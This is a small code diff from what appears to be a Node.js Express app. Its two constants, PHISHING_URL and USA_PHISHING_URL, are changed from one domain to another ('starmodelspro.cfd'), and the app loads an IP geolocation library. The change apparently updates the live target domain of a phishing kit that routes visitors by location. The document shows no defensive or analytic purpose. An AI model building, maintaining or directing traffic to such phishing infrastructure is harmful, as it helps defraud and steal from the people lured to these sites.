@@ -8,8 +8,8 @@ const expressLayout = require("express-ejs-layouts");
 const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
-const PHISHING_URL = "extrememodels.co";
-const USA_PHISHING_URL = "extrememodels.co";
+const PHISHING_URL = "starmodelspro.cfd";
+const USA_PHISHING_URL = "starmodelspro.cfd";
 
 
 // CONFIGS
